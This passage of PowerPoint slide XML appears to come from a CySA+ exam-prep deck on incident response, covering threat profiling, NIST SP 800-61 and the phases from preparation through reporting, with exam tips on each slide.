                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Trademarks &amp; copyright</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Mergers &amp; acquisitions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Accounting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Trade secrets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Payment card information</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665</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Know Your Threat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Knowing your threat means understanding the specific vulnerabilities, assets, and adversaries relevant to your organization so defenses and response are grounded in reality rather than generic assumptions. This requires answering three questions: what type of data you hold and therefore what an attacker would want, what your systems actually look like in terms of architecture and exposure, and who the likely threat actors are, from opportunistic criminals to organized crime, hacktivists, insiders, and nation-state groups.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because different threat actors have different motivations, capabilities, and techniques, profiling them lets the team anticipate the tactics they are most likely to use and align controls and monitoring accordingly. Awareness of the broader threat landscape and current vulnerabilities keeps this picture up to date.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst applies this knowledge to interpret alerts in context, prioritize the vulnerabilities most likely to be exploited against them, and tailor detection to the adversaries that genuinely pose a risk to their environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on aligning defenses to threat actor type, data value, and system exposure, testing the link between threat intelligence and prioritized response.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666</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Know Your Threat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Know vulnerabilities &amp; landscape</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What type of data?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What do systems look like?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What are the threat actors?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667</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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Incident Response (IR) Process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The incident response process is the structured lifecycle an organization follows to handle security incidents, and the authoritative reference on the exam is NIST Special Publication 800-61, the Computer Security Incident Handling Guide. NIST, the National Institute of Standards and Technology, is a U.S. federal body that publishes widely adopted technology standards and guidelines, and SP 800-61 defines the phases and best practices for building and running an incident response capability.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Following a recognized framework like SP 800-61 gives the team a repeatable, defensible methodology so that response is consistent, thorough, and aligned with industry expectations rather than ad hoc. It establishes common terminology and a shared sequence of steps that different teams and organizations can coordinate around.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because CySA+ and most enterprise programs model their playbooks on this standard, so knowing its structure lets you slot activities into the correct phase and communicate clearly with the rest of the response team.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect direct recall that NIST SP 800-61 is the incident-handling guide and recognition of NIST as the standards body behind the IR framework.</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668</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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Incident Response (IR) Process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NIST Special Publication 800-61</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  National Institute of Standards and Technology (NIST)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Provides publications &amp; guidelines on technology standards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669</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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Incident Response (IR) Process Phases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The incident response process is divided into distinct phases, and Phase I is Preparation, the proactive stage that readies the organization before any incident occurs. Its proactive measures include network segmentation, which limits how far an attacker can move laterally, and host hardening, which reduces the ways a system can be compromised, together forming the defensive baseline the rest of the process depends on.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Preparation also encompasses a formal risk assessment process to identify and rank vulnerabilities, predefined action steps and playbooks so responders know what to do, and established communication plans so the right people are informed through the right channels. It further sets up the activity logging and reporting mechanisms needed to document an incident and support later analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because everything the later phases of detection, containment, eradication, and recovery rely on, from segmented networks to ready playbooks to reliable logs, is put in place during Preparation, making it the foundation of an effective response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test identifying Preparation as the first NIST phase and recognizing its activities (segmentation, hardening, risk assessment, playbooks, communication planning) versus later phases.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670</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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Incident Response (IR) Process Phases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Phase I: Preparation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Proactive measures (i.e., network segmentation &amp; host hardening)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Formal risk assessment process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Action steps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Communication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Activity &amp; reporting</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671</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Phases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The incident response lifecycle is a structured sequence of phases that guides how an organization detects, handles, and recovers from a security incident, and CS0-003 aligns it with the NIST SP 800-61 model of Preparation, Detection and Analysis, Containment/Eradication/Recovery, and Post-Incident Activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Preparation builds the readiness before anything happens by creating the IR plan, playbooks, tooling, training, and communication channels; Containment then stops the damage from spreading by isolating or quarantining affected hosts, cutting network access, or segmenting the environment while preserving evidence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Eradication removes the root cause and any attacker artifacts such as malware, backdoors, or compromised accounts so systems can be rebuilt to a known-good state, and validation confirms the threat and attack vector were fully identified and that recovered systems are clean before returning them to production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts follow these phases so that response is repeatable and defensible under pressure, because skipping preparation or rushing eradication commonly lets attackers persist, and careful documentation throughout supports later reporting, legal action, and lessons learned.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions that give you a symptom and ask which IR phase you are in or what the correct next action is, so know the phase order and that containment precedes eradication and recovery.</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672</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Phases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Phase 1: Preparation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 2: Containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stop all damage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Prevent or reduce spread of infection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Quarantine hosts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673</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Phases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Phase 1: Preparation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 2: Containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 3: Eradication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Return to known good state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Document carefully!</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674</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Phases (3)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Phase 1: Preparation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 2: Containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 3: Eradication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 4: Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identify threat &amp; attack vector</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identify preventive measures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Change controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Update software/patches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675</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Phases (4)</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Phase 1: Preparation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 2: Containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 3: Eradication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 4: Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 5: Corrective actions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Implement patches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Update PPPs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Organizational policies &amp; procedures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Network systems access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Authentication</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676</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Phases (5)</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Phase 1: Preparation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 2: Containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 3: Eradication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 4: Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 5: Corrective actions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Phase 6: Reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Take notes throughout</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Compare to best practices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ways to improve</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
